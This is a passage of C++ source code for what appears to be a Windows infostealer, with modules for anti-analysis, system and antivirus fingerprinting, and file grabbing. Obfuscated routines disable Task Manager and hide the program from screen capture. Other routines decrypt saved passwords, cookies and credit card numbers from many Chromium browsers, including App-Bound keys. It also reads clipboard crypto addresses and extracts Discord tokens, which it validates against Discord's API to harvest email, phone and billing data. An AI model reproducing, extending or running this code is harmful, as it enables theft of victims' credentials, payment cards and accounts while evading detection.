                    } while (DynAPI::Proc32Next(hSnap, &pe));
                }
                if (Internal::_CloseHandle) Internal::_CloseHandle(hSnap);
                else DynAPI::CloseH(hSnap);
            }
        }

        return false;
    }

    bool AntiAnalysis::SetMutex() {
        JUNK_CODE_SMALL

        char guid[64] = {};
        HKEY hKey;
        OBFS_W_DECL(cryptKey, L"SOFTWARE\\Microsoft\\Cryptography");
        if (DynAPI::RegOpenKeyEx(HKEY_LOCAL_MACHINE,
            cryptKey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(guid) - 1;
            OBFS_W_DECL(guidVal, L"MachineGuid");
            DynAPI::RegQueryValueEx(hKey, guidVal, NULL, NULL, (LPBYTE)guid, &sz);
            OBFS_W_WIPE(guidVal);
            DynAPI::RegClose(hKey);
        }
        OBFS_W_WIPE(cryptKey);

        if (guid[0] == 0) {
            unsigned __int64 tsc = __rdtsc();
            Internal::IntToStr((int)(tsc & 0x7FFFFFFF), guid, sizeof(guid));
        }

        HANDLE hMutex = Internal::_CreateMutexA(nullptr, TRUE, guid);
        if (Internal::_GetLastError() == ERROR_ALREADY_EXISTS) {
            if (hMutex) {
                if (Internal::_CloseHandle) Internal::_CloseHandle(hMutex);
            }
            return false;
        }
        return true;
    }

    void AntiAnalysis::BlockTaskManager(bool block) {
        JUNK_CODE_SMALL
        HKEY hKey;
        OBFS_W_DECL(keyPath, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        OBFS_W_DECL(valName, L"DisableTaskMgr");
        DWORD val = block ? 1 : 0;
        if (DynAPI::RegCreateKeyEx(HKEY_CURRENT_USER, keyPath, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            DynAPI::RegSetValueEx(hKey, valName, 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
            DynAPI::RegClose(hKey);
        }
        OBFS_W_WIPE(keyPath);
        OBFS_W_WIPE(valName);
    }

    void AntiAnalysis::HideFromScreenCapture() {
        JUNK_CODE_SMALL
        if (DynAPI::SetWndDisplayAffinity && DynAPI::GetDesktopWnd) {
            HWND hWnd = DynAPI::GetDesktopWnd();
            if (hWnd) DynAPI::SetWndDisplayAffinity(hWnd, 0x00000011  );
        }
    }
}

#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <sstream>
#pragma comment(lib, "iphlpapi.lib")
namespace Modules {
    static std::string RegStrA(HKEY root, const wchar_t* path, const wchar_t* val) {
        HKEY hKey;
        if (DynAPI::RegOpenKeyEx(root, path, 0, KEY_READ, &hKey) != ERROR_SUCCESS) return "";
        char buf[512] = {};
        DWORD sz = sizeof(buf);
        DynAPI::RegQueryValueEx(hKey, val, NULL, NULL, (LPBYTE)buf, &sz);
        DynAPI::RegClose(hKey);
        return buf;
    }
    SystemInfoData SystemInfo::Collect() {
        JUNK_CODE_LARGE
        SLOG("[*] Fingerprinting system...");
        SystemInfoData d;
        {
            char buf[256] = {};
            DWORD sz = sizeof(buf);
            if (DynAPI::GetCompNameA(buf, &sz)) d.Hostname = buf;
            sz = sizeof(buf);
            if (DynAPI::GetUserNmA(buf, &sz)) d.Username = buf;
        }
        SLOG("  [+] Hostname: %s, Username: %s", d.Hostname.c_str(), d.Username.c_str());
        {
            std::string product = RegStrA(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName");
            std::string build   = RegStrA(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentBuildNumber");
            std::string disp    = RegStrA(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"DisplayVersion");
            d.OS = product + S(" ") + disp + S(" (Build ") + build + S(")");
        }
        SLOG("  [+] OS: %s", d.OS.c_str());
        {
            int ci[4] = {};
            char brand[49] = {};
            __cpuid(ci, 0x80000002); memcpy(brand,      ci, 16);
            __cpuid(ci, 0x80000003); memcpy(brand + 16, ci, 16);
            __cpuid(ci, 0x80000004); memcpy(brand + 32, ci, 16);
            d.CPU = brand;
        }
        {
            std::string gpu = RegStrA(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
                L"DriverDesc");
            if (gpu.empty()) gpu = RegStrA(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0001",
                L"DriverDesc");
            d.GPU = gpu.empty() ? S("Unknown") : gpu;
        }
        {
            MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
            if (DynAPI::GlobalMemStatusEx(&ms))
                d.RAM = std::to_string(ms.ullTotalPhys / (1024ULL * 1024 * 1024)) + S(" GB");
        }
        {
            ULARGE_INTEGER total = {}, free_ = {};
            GetDiskFreeSpaceExA("C:\\", nullptr, &total, &free_);
            d.Disk = std::to_string(total.QuadPart / (1024ULL * 1024 * 1024)) + S(" GB total, ")
                   + std::to_string(free_.QuadPart / (1024ULL * 1024 * 1024)) + S(" GB free");
        }
        if (DynAPI::GetSysMetrics) {
            int w = DynAPI::GetSysMetrics(0  );
            int h = DynAPI::GetSysMetrics(1  );
            d.Screen = std::to_string(w) + S("x") + std::to_string(h);
        }
        d.HWID = RegStrA(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid");
        {
            char buf[256];
            gethostname(buf, sizeof(buf));  
            struct hostent* he = gethostbyname(buf);
            if (he && he->h_addrtype == AF_INET) {
                struct in_addr addr;
                memcpy(&addr, he->h_addr_list[0], sizeof(addr));
                d.LocalIP = inet_ntoa(addr);
            }
        }
        SLOG("  [+] Local IP: %s", d.LocalIP.c_str());
        {
        SLOG("[*] Fetching public IP...");
            std::string ip = DynAPI::HttpGet(L"api.ipify.org", L"/", true);
            if (ip.empty()) ip = DynAPI::HttpGet(L"api.ipify.org", L"/", false);
            d.PublicIP = ip.empty() ? S("N/A") : ip;
            SLOG("  [+] Public IP: %s", d.PublicIP.c_str());
        }
        {
            const char* avList[] = {
                "msmpeng","msseces","avgwdsvc","avguard","avp","ekrn","bdagent",
                "vsserv","nortonsecurity","nis","safeservice","mbam","csc",
                "savservice","avastsvc","egui","sophosav","hitmanpro",
                "malwarebytes","drwagntd","vkise","kavfsslp","kav","klam",nullptr
            };
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
                if (Process32First(hSnap, &pe)) {
                    do {
                        char name[MAX_PATH];
                        strncpy_s(name, pe.szExeFile, _TRUNCATE);
                        for (char* c = name; *c; ++c) *c = (char)tolower((unsigned char)*c);
                        for (int i = 0; avList[i]; ++i)
                            if (strstr(name, avList[i])) {
                                d.RunningAV.push_back(pe.szExeFile);
                                break;
                            }
                    } while (Process32Next(hSnap, &pe));
                }
                CloseHandle(hSnap);
            }
        }
        return d;
    }
    std::string SystemInfo::Format(const SystemInfoData& d) {
        std::stringstream ss;
        ss << S("┌─[ System Info ]─────────────────────────────────\n");
        ss << S("│ Hostname   : ") << d.Hostname  << "\n";
        ss << S("│ Username   : ") << d.Username  << "\n";
        ss << S("│ OS         : ") << d.OS        << "\n";
        ss << S("│ CPU        : ") << d.CPU       << "\n";
        ss << S("│ GPU        : ") << d.GPU       << "\n";
        ss << S("│ RAM        : ") << d.RAM       << "\n";
        ss << S("│ Disk C:\\   : ") << d.Disk      << "\n";
        ss << S("│ Screen     : ") << d.Screen    << "\n";
        ss << S("│ HWID       : ") << d.HWID      << "\n";
        ss << S("│ Local IP   : ") << d.LocalIP   << "\n";
        ss << S("│ Public IP  : ") << d.PublicIP  << "\n";
        if (!d.RunningAV.empty()) {
            ss << S("│ AV Running : ");
            for (auto& av : d.RunningAV) ss << av << " ";
            ss << "\n";
        } else {
            ss << S("│ AV Running : None detected\n");
        }
        ss << S("└─────────────────────────────────────────────────\n");
        return ss.str();
    }
}

#include <filesystem>
#include <regex>
#include <fstream>
#include <algorithm>
namespace fs = std::filesystem;
namespace Modules {
    std::string Chromium::PathJoin(const std::string& a, const std::string& b) {
        return (fs::path(a) / b).string();
    }
    std::vector<BrowserPaths> Chromium::GetBrowserList() {
        char local[MAX_PATH] = {}, roaming[MAX_PATH] = {};
        DynAPI::SHGetFolderA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local);
        DynAPI::SHGetFolderA(NULL, CSIDL_APPDATA, NULL, 0, roaming);
        std::string L = local, R = roaming;
        return {
            {S("Chrome"),              PathJoin(L, S("Google\\Chrome\\User Data")),                      true},
            {S("Chrome Canary"),       PathJoin(L, S("Google\\Chrome SxS\\User Data")),                  true},
            {S("Chrome Beta"),         PathJoin(L, S("Google\\Chrome Beta\\User Data")),                  true},
            {S("Chrome Dev"),          PathJoin(L, S("Google\\Chrome Dev\\User Data")),                   true},
            {S("Edge"),                PathJoin(L, S("Microsoft\\Edge\\User Data")),                      true},
            {S("Edge Beta"),           PathJoin(L, S("Microsoft\\Edge Beta\\User Data")),                  true},
            {S("Edge Dev"),            PathJoin(L, S("Microsoft\\Edge Dev\\User Data")),                   true},
            {S("Edge Canary"),         PathJoin(L, S("Microsoft\\Edge SxS\\User Data")),                   true},
            {S("Brave"),               PathJoin(L, S("BraveSoftware\\Brave-Browser\\User Data")),         false},
            {S("Brave Nightly"),       PathJoin(L, S("BraveSoftware\\Brave-Browser-Nightly\\User Data")), false},
            {S("Opera"),               PathJoin(R, S("Opera Software\\Opera Stable")),                    false},
            {S("Opera GX"),            PathJoin(R, S("Opera Software\\Opera GX Stable")),                 false},
            {S("Opera Neon"),          PathJoin(R, S("Opera Software\\Opera Neon")),                      false},
            {S("Vivaldi"),             PathJoin(L, S("Vivaldi\\User Data")),                              false},
            {S("Yandex"),              PathJoin(L, S("Yandex\\YandexBrowser\\User Data")),                false},
            {S("Yandex Beta"),         PathJoin(L, S("Yandex\\YandexBrowserBeta\\User Data")),            false},
            {S("CentBrowser"),         PathJoin(L, S("CentBrowser\\User Data")),                          false},
            {S("7Star"),               PathJoin(L, S("7Star\\7Star\\User Data")),                         false},
            {S("Amigo"),               PathJoin(L, S("Amigo\\User Data")),                                false},
            {S("CocCoc"),              PathJoin(L, S("CocCoc\\Browser\\User Data")),                      false},
            {S("Comodo Dragon"),       PathJoin(L, S("Comodo\\Dragon\\User Data")),                        false},
            {S("Epic"),                PathJoin(L, S("Epic Privacy Browser\\User Data")),                  false},
            {S("Iridium"),             PathJoin(L, S("Iridium\\User Data")),                               false},
            {S("Kometa"),              PathJoin(L, S("Kometa\\User Data")),                                false},
            {S("Orbitum"),             PathJoin(L, S("Orbitum\\User Data")),                               false},
            {S("Sputnik"),             PathJoin(L, S("Sputnik\\Sputnik\\User Data")),                      false},
            {S("Torch"),               PathJoin(L, S("Torch\\User Data")),                                 false},
            {S("Uran"),                PathJoin(L, S("uCozMedia\\Uran\\User Data")),                       false},
            {S("Sleipnir"),            PathJoin(R, S("Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer")), false},
            {S("Citrio"),              PathJoin(L, S("CatalinaGroup\\Citrio\\User Data")),                 false},
        };
    }
    std::string Chromium::DecryptValue(const std::string& raw, const std::vector<BYTE>& masterKey, const std::vector<BYTE>& appBoundKey) {
        if (raw.empty()) return "";
        std::vector<BYTE> data(raw.begin(), raw.end());
        if (raw.size() >= 3 && raw[0] == 'v' && raw[1] == '2' && raw[2] == '0') {
            if (!appBoundKey.empty()) {
                return AppBound::DecryptAppBoundValue(data, appBoundKey);
            }
            return "";  
        }
        if (raw.size() >= 3 && (raw.substr(0, 3) == "v10" || raw.substr(0, 3) == "v11")) {
            if (!masterKey.empty()) {
                if (data.size() < 15) return "";
                std::vector<BYTE> iv(data.begin() + 3, data.begin() + 15);
                std::vector<BYTE> payload(data.begin() + 15, data.end());
                if (payload.size() < 16) return "";
                std::vector<BYTE> ct(payload.begin(), payload.end() - 16);
                std::vector<BYTE> tag(payload.end() - 16, payload.end());
                auto dec = Crypto::DecryptAES_GCM(masterKey, iv, {}, ct, tag);
                return std::string(dec.begin(), dec.end());
            }
            return "";
        }
        return Crypto::DecryptDPAPI(data);
    }
    std::vector<BYTE> Chromium::GetMasterKey(const std::string& dataPath, std::vector<BYTE>& appBoundKeyOut) {
        std::string lsFile = PathJoin(dataPath, S("Local State"));
        if (!fs::exists(lsFile)) return {};
        std::ifstream f(lsFile, std::ios::binary);
        if (!f) return {};
        std::string content((std::istreambuf_iterator<char>(f)), {});
        std::regex reg(S("\"encrypted_key\":\"([^\"]+)\""));
        std::smatch m;
        std::string b64Key;
        if (std::regex_search(content, m, reg)) b64Key = m[1].str();
        if (b64Key.empty()) return {};
        auto decoded = Crypto::Base64Decode(b64Key);
        if (decoded.size() <= 5) return {};
        std::vector<BYTE> keyBlob(decoded.begin() + 5, decoded.end());
        std::string masterKeyStr = Crypto::DecryptDPAPI(keyBlob);
        std::vector<BYTE> masterKey(masterKeyStr.begin(), masterKeyStr.end());
        std::regex abRegV20(S("\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\""));
        if (std::regex_search(content, m, abRegV20)) {
            std::string abB64 = m[1].str();
            SLOG("  [*] Found v20 App-Bound key (size: %zu)", abB64.size());
            auto abBlob = Crypto::Base64Decode(abB64);
            if (abBlob.size() > 4 && memcmp(abBlob.data(), "APPB", 4) == 0) {
                std::vector<BYTE> encryptedKey(abBlob.begin() + 4, abBlob.end());
                auto abKey = AppBound::DeriveV20MasterKey(encryptedKey);
                if (!abKey.empty()) {
                    appBoundKeyOut = abKey;
                    SLOG("  [+] Decrypted v20 App-Bound Master Key. Size: %zu", appBoundKeyOut.size());
                } else {
                    SLOG("  [-] Failed to derive v20 master key from blob.");
                }
            } else {
                SLOG("  [-] Invalid v20 blob header or size.");
            }
        }
        if (appBoundKeyOut.empty()) {
            std::regex abReg(S("\"app_bound_fixed_data\"\\s*:\\s*\"([^\"]+)\""));
            if (std::regex_search(content, m, abReg)) {
                std::string abB64 = m[1].str();
                SLOG("  [*] Found fixed App-Bound data (size: %zu)", abB64.size());
                auto abBlob = Crypto::Base64Decode(abB64);
                if (!abBlob.empty()) {
                    auto abKey = AppBound::DecryptAppBoundKey(abBlob);
                    if (!abKey.empty()) {
                        appBoundKeyOut = abKey;
                        SLOG("  [+] Decrypted fixed App-Bound Key.");
                    } else {
                        SLOG("  [-] Failed to decrypt fixed App-Bound Key.");
                    }
                }
            }
        }
        return masterKey;
    }
    std::vector<std::string> Chromium::GetProfilePaths(const std::string& dataPath, const std::string& file) {
        std::vector<std::string> out;
        auto add = [&](const std::string& sub) {
            std::string p = PathJoin(dataPath, PathJoin(sub, file));
            if (fs::exists(p)) out.push_back(p);
        };
        add("");           
        add("Default");
        if (!fs::exists(dataPath)) return out;
        try {
            for (auto& e : fs::directory_iterator(dataPath)) {
                if (!e.is_directory()) continue;
                std::string n = e.path().filename().string();
                if (n.find("Profile") != std::string::npos) add(n);
            }
        } catch (...) {}
        return out;
    }
    std::vector<Account> Chromium::Grab() {
        JUNK_CODE_LARGE
        std::vector<Account> all;
        for (auto& b : GetBrowserList()) {
            if (!fs::exists(b.userDataPath)) continue;
            SLOG("[*] Harvesting %s...", b.name.c_str());
            std::vector<BYTE> appBoundKey;
            auto masterKey = GetMasterKey(b.userDataPath, appBoundKey);
            if (masterKey.empty()) {
                SLOG("  [-] Failed to retrieve master key for %s.", b.name.c_str());
            } else {
                SLOG("  [+] Master key retrieved. App-Bound key: %s", appBoundKey.empty() ? "No" : "Yes");
            }
            auto pw  = GetPasswords(b, masterKey, appBoundKey);
            if (!pw.empty()) {  }
            auto ck  = GetCookies  (b, masterKey, appBoundKey);
            if (!ck.empty()) {  }
            auto cd  = GetCards    (b, masterKey, appBoundKey);
            if (!cd.empty()) {  }
            auto hi  = GetHistory  (b);
            if (!hi.empty()) {  }
            all.insert(all.end(), pw.begin(),  pw.end());
            all.insert(all.end(), ck.begin(),  ck.end());
            all.insert(all.end(), cd.begin(),  cd.end());
            all.insert(all.end(), hi.begin(),  hi.end());
        }
        return all;
    }
    std::vector<Account> Chromium::GetPasswords(const BrowserPaths& b, const std::vector<BYTE>& mk, const std::vector<BYTE>& abk) {
        std::vector<Account> out;
        for (auto& f : GetProfilePaths(b.userDataPath, S("Login Data"))) {
            SQLite::SQLiteHandler db(f);
            if (!db.ReadTable(S("logins"))) continue;
            for (int i = 0; i < db.GetRowCount(); ++i) {
                std::string url  = db.GetValue(i, S("origin_url"));
                std::string user = db.GetValue(i, S("username_value"));
                std::string raw  = db.GetValue(i, S("password_value"));
                if (raw.empty() || user.empty()) continue;
                std::string dec = DecryptValue(raw, mk, abk);
                if (!dec.empty()) out.push_back({url, user, dec, b.name, S("Password")});
            }
        }
        return out;
    }
    std::vector<Account> Chromium::GetCookies(const BrowserPaths& b, const std::vector<BYTE>& mk, const std::vector<BYTE>& abk) {
        std::vector<Account> out;
        std::vector<std::string> files;
        for (auto& f : GetProfilePaths(b.userDataPath, S("Network\\Cookies")))  files.push_back(f);
        for (auto& f : GetProfilePaths(b.userDataPath, S("Cookies")))            files.push_back(f);
        for (auto& cf : files) {
            SQLite::SQLiteHandler db(cf);
            if (!db.ReadTable(S("cookies"))) continue;
            for (int i = 0; i < db.GetRowCount(); ++i) {
                std::string host = db.GetValue(i, S("host_key"));
                std::string name = db.GetValue(i, S("name"));
                std::string raw  = db.GetValue(i, S("encrypted_value"));
                if (raw.empty()) continue;
                std::string dec = DecryptValue(raw, mk, abk);
                if (!dec.empty()) out.push_back({host, name, dec, b.name, S("Cookie")});
            }
        }
        return out;
    }
    std::vector<Account> Chromium::GetCards(const BrowserPaths& b, const std::vector<BYTE>& mk, const std::vector<BYTE>& abk) {
        std::vector<Account> out;
        for (auto& f : GetProfilePaths(b.userDataPath, S("Web Data"))) {
            SQLite::SQLiteHandler db(f);
            if (!db.ReadTable(S("credit_cards"))) continue;
            for (int i = 0; i < db.GetRowCount(); ++i) {
                std::string name  = db.GetValue(i, S("name_on_card"));
                std::string expm  = db.GetValue(i, S("expiration_month"));
                std::string expy  = db.GetValue(i, S("expiration_year"));
                std::string raw   = db.GetValue(i, S("card_number_encrypted"));
                if (raw.empty()) continue;
                std::string dec = DecryptValue(raw, mk, abk);
                if (!dec.empty()) {
                    std::string info = S("Exp: ") + expm + S("/") + expy;
                    out.push_back({name, info, dec, b.name, S("CreditCard")});
                }
            }
        }
        return out;
    }
    std::vector<Account> Chromium::GetHistory(const BrowserPaths& b) {
        std::vector<Account> out;
        for (auto& f : GetProfilePaths(b.userDataPath, S("History"))) {
            SQLite::SQLiteHandler db(f);
            if (!db.ReadTable(S("urls"))) continue;
            int total = (int)db.GetRowCount();
            int limit = (total < 200) ? total : 200;
            for (int i = 0; i < limit; ++i) {
                std::string url   = db.GetValue(i, S("url"));
                std::string title = db.GetValue(i, S("title"));
                std::string count = db.GetValue(i, S("visit_count"));
                if (!url.empty()) out.push_back({url, title, count, b.name, S("History")});
            }
        }
        return out;
    }
}

#include <windows.h>
#include <regex>
#include <sstream>
namespace Modules {
    ClipboardData Clipboard::Grab() {
        JUNK_CODE_SMALL
        SLOG("[*] Reading clipboard...");
        ClipboardData d;
        d.Type = S("Empty");
        if (!OpenClipboard(nullptr)) return d;
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* raw = (char*)GlobalLock(hData);
            if (raw) {
                std::string text(raw);
                GlobalUnlock(hData);
                d.Content = text.size() > 4096 ? text.substr(0, 4096) : text;
                if (std::regex_search(text, std::regex(S("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$")))) {
                    d.Type = S("CryptoAddress-BTC");   
                } else if (std::regex_search(text, std::regex(S("^bc1[a-z0-9]{6,87}$")))) {
                    d.Type = S("CryptoAddress-BTC-Bech32");  
                } else if (std::regex_search(text, std::regex(S("^0x[0-9a-fA-F]{40}$")))) {
                    d.Type = S("CryptoAddress-ETH");    
                } else if (std::regex_search(text, std::regex(S("^[1-9A-HJ-NP-Za-km-z]{32,44}$")))) {
                    d.Type = S("CryptoAddress-SOL");    
                } else if (std::regex_search(text, std::regex(S("^T[0-9A-Za-z]{33}$")))) {
                    d.Type = S("CryptoAddress-TRX");    
                } else if (std::regex_search(text, std::regex(S("https?://")))) {
                    d.Type = S("URL");
                } else if (!text.empty()) {
                    d.Type = S("Text");
                }
            }
        }
        CloseClipboard();

        return d;
    }
    std::string Clipboard::Format(const ClipboardData& d) {
        std::stringstream ss;
        ss << S("Type    : ") << d.Type    << "\n";
        ss << S("Content : ") << d.Content << "\n";
        return ss.str();
    }
}

#include <filesystem>
#include <fstream>
#include <regex>
#include <set>
#include <sstream>
#include <algorithm>
#include <winhttp.h>
namespace fs = std::filesystem;
namespace Modules {
    std::string Discord::ParseJson(const std::string& json, const std::string& key) {
        std::string pat = "\"" + key + "\":\\s*\"?([^\"\\},]+)\"?";
        std::regex r(pat);
        std::smatch m;
        if (std::regex_search(json, m, r)) {
            std::string v = m[1].str();
            if (!v.empty() && v.front() == '"') v = v.substr(1);
            if (!v.empty() && v.back() == '"') v.pop_back();
            return v;
        }
        return "";
    }
    static std::string DiscordGet(const std::string& token, const std::wstring& path) {
        if (!DynAPI::WHttpOpen) return "";
        HINTERNET hS = DynAPI::WHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hS) return "";
        DynAPI::WHttpSetTime(hS, 6000, 6000, 6000, 6000);
        HINTERNET hC = DynAPI::WHttpConnect(hS, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hC) { DynAPI::WHttpCloseH(hS); return ""; }
        HINTERNET hR = DynAPI::WHttpOpenReq(hC, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!hR) { DynAPI::WHttpCloseH(hC); DynAPI::WHttpCloseH(hS); return ""; }
        std::wstring auth = L"Authorization: " + std::wstring(token.begin(), token.end());
        DynAPI::WHttpSendReq(hR, auth.c_str(), (DWORD)auth.size(), WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        DynAPI::WHttpRecvResp(hR, NULL);
        std::string body;
        DWORD avail = 0;
        while (DynAPI::WHttpQueryAvail && DynAPI::WHttpQueryAvail(hR, &avail) && avail > 0) {
            std::vector<char> buf(avail + 1, 0);
            DWORD rd = 0;
            if (DynAPI::WHttpReadData(hR, buf.data(), avail, &rd)) body.append(buf.data(), rd);
        }
        DynAPI::WHttpCloseH(hR); DynAPI::WHttpCloseH(hC); DynAPI::WHttpCloseH(hS);
        return body;
    }
    std::string Discord::DecryptVaultToken(const std::string& b64, const std::string& lsPath) {
        auto blob = Crypto::Base64Decode(b64);
        std::ifstream f(lsPath, std::ios::binary);
        if (!f) return "";
        std::string content((std::istreambuf_iterator<char>(f)), {});
        std::regex reg("\"encrypted_key\":\"([^\"]+)\"");
        std::smatch m;
        if (!std::regex_search(content, m, reg)) return "";
        auto keyBlob = Crypto::Base64Decode(m[1].str());
        if (keyBlob.size() <= 5) return "";
        std::string dkStr = Crypto::DecryptDPAPI(std::vector<BYTE>(keyBlob.begin() + 5, keyBlob.end()));
        std::vector<BYTE> mk(dkStr.begin(), dkStr.end());
        if (blob.size() < 15) return "";
        std::vector<BYTE> iv(blob.begin() + 3, blob.begin() + 15);
        std::vector<BYTE> payload(blob.begin() + 15, blob.end());
        if (payload.size() < 16) return "";
        std::vector<BYTE> ct(payload.begin(), payload.end() - 16);
        std::vector<BYTE> tag(payload.end() - 16, payload.end());
        auto dec = Crypto::DecryptAES_GCM(mk, iv, {}, ct, tag);
        return std::string(dec.begin(), dec.end());
    }
    std::vector<std::string> Discord::ExtractFromPath(const std::string& leveldbPath, const std::string& lsPath) {
        std::vector<std::string> tokens;
        if (!fs::exists(leveldbPath)) return tokens;
        std::regex re_plain(S("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"));
        std::regex re_vault(S("dQw4w9WgXcQ:([^\"\\\\]+)"));
        try {
            for (auto& entry : fs::directory_iterator(leveldbPath)) {
                auto ext = entry.path().extension().string();
                if (ext != S(".log") && ext != S(".ldb")) continue;
                std::ifstream file(entry.path(), std::ios::binary);
                std::string content((std::istreambuf_iterator<char>(file)), {});
                std::smatch m;
                std::string::const_iterator it = content.cbegin();
                while (std::regex_search(it, content.cend(), m, re_plain)) {
                    tokens.push_back(m[0].str());
                    it = m.suffix().first;
                }
                it = content.cbegin();
                while (std::regex_search(it, content.cend(), m, re_vault)) {
                    std::string dec = DecryptVaultToken(m[1].str(), lsPath);
                    if (!dec.empty()) tokens.push_back(dec);
                    it = m.suffix().first;
                }
            }
        } catch (...) {}
        return tokens;
    }
    DiscordAccount Discord::FetchInfo(const std::string& token, const std::string& source) {
        DiscordAccount acc;
        acc.Token  = token;
        acc.Source = source;
        std::string me = DiscordGet(token, L"/api/v9/users/@me");
        if (me.empty() || me.find("\"id\"") == std::string::npos) {
            acc.Valid = false;
            return acc;
        }
        acc.Valid    = true;
        acc.Username = ParseJson(me, "username") + "#" + ParseJson(me, "discriminator");
        acc.ID       = ParseJson(me, "id");
        acc.Email    = ParseJson(me, "email");
        acc.Phone    = ParseJson(me, "phone");
        acc.MFA      = ParseJson(me, "mfa_enabled");
        int pt = 0;
        try { pt = std::stoi(ParseJson(me, "premium_type")); } catch (...) {}
        acc.Nitro = (pt == 0 ? "None" : pt == 1 ? "Nitro Classic" : pt == 2 ? "Nitro Boost" : "Nitro Basic");
        std::string bill = DiscordGet(token, L"/api/v6/users/@me/billing/payment-sources");
        if (!bill.empty() && bill.find("type") != std::string::npos) {
            acc.Billing = bill.find("\"type\":1") != std::string::npos ? "Card" :
                          bill.find("\"type\":2") != std::string::npos ? "PayPal" : "Other";
        } else {
            acc.Billing = "None";
        }
        std::string av = ParseJson(me, "avatar");
        if (!av.empty() && acc.ID != "None")
            acc.Avatar = "https://cdn.discordapp.com/avatars/" + acc.ID + "/" + av + ".png";
        return acc;
    }

    std::vector<DiscordAccount> Discord::Grab() {
        JUNK_CODE_LARGE
        char appdata[MAX_PATH] = {};
        GetEnvironmentVariableA(S("APPDATA").c_str(), appdata, MAX_PATH);
        std::string R = appdata;
        const std::pair<std::string, std::string> discordSources[] = {
            {S("Discord"),      R + S("\\discord")},
            {S("Discord PTB"),  R + S("\\discordptb")},
            {S("Discord Canary"),R + S("\\discordcanary")},
            {"", ""}
        };
        std::set<std::string> seen;
        std::vector<DiscordAccount> accounts;
        for (int i = 0; !discordSources[i].first.empty(); ++i) {
            auto& [name, path] = discordSources[i];
            SLOG("[*] Checking %s at %s...", name.c_str(), path.c_str());
            std::string leveldb  = path + S("\\Local Storage\\leveldb");
            std::string lsFile   = path + S("\\Local State");
            auto toks = ExtractFromPath(leveldb, lsFile);
            if (toks.empty()) {
                SLOG("  [-] No tokens found in %s.", name.c_str());
                continue;
            }
            SLOG("  [+] Found %zu potential tokens. Validating...", toks.size());
            for (auto& t : toks) {
                if (!seen.insert(t).second) continue;
                auto acc = FetchInfo(t, name);
                if (acc.Valid) {
                    SLOG("    [+] Valid token found for user: %s", acc.Username.c_str());
                } else {
                    SLOG("    [-] Invalid token: %s...", t.substr(0, 15).c_str());
                }
                accounts.push_back(acc);
            }
        }
        return accounts;
    }
    std::string Discord::Format(const std::vector<DiscordAccount>& data) {
        if (data.empty()) return S("No Discord tokens found.\n");
        std::stringstream ss;
        int n = 1;
        for (auto& d : data) {
            ss << S("Discord Account #") << n++ << (d.Valid ? S(" [VALID]") : S(" [INVALID]")) << "\n";
            ss << S("  Source      : ") << d.Source   << "\n";
            ss << S("  Token       : ") << d.Token    << "\n";
            if (d.Valid) {
                ss << S("  Username    : ") << d.Username << "\n";
                ss << S("  ID          : ") << d.ID       << "\n";
                ss << S("  Email       : ") << d.Email    << "\n";
                ss << S("  Phone       : ") << d.Phone    << "\n";
                ss << S("  Nitro       : ") << d.Nitro    << "\n";
                ss << S("  MFA         : ") << d.MFA      << "\n";
                ss << S("  Billing     : ") << d.Billing  << "\n";
                ss << S("  Avatar      : ") << d.Avatar   << "\n";
            }
            ss << "\n";
        }
        return ss.str();
    }
}

#include <filesystem>
#include <shlobj.h>
namespace fs = std::filesystem;
namespace Modules {
    void FileGrabber::Grab() {
        JUNK_CODE_LARGE
        SLOG("[*] Starting File Grabber search...");
        std::vector<int> folders = {CSIDL_DESKTOP, CSIDL_MYDOCUMENTS};
        for (int folder : folders) {
            char path[MAX_PATH];
            if (DynAPI::SHGetFolderA(NULL, folder, NULL, 0, path) == S_OK) {
                ScanDirectory(path);
            }
        }
        char profile[MAX_PATH];
        if (DynAPI::SHGetFolderA(NULL, CSIDL_PROFILE, NULL, 0, profile) == S_OK) {
            ScanDirectory(std::string(profile) + S("\\Downloads"));
        }
        SLOG("[+] File Grabber search complete.");
    }
    void FileGrabber::ScanDirectory(std::string path) {
        if (!fs::exists(path)) return;
        try {
            for (const auto& entry : fs::recursive_directory_iterator(path, fs::directory_options::skip_permission_denied)) {
                if (entry.is_regular_file()) {
                    std::string ext = entry.path().extension().string();
                    std::string name = entry.path().filename().string();
                    for (auto& c : name) c = (char)tolower(c);
                    bool matchesExt = false;
                    for (const auto& e : Config::InterestingExtensions) {
                        if (ext == e) { matchesExt = true; break; }
                    }
                    if (matchesExt) {
                        for (const auto& kw : Config::Keywords) {
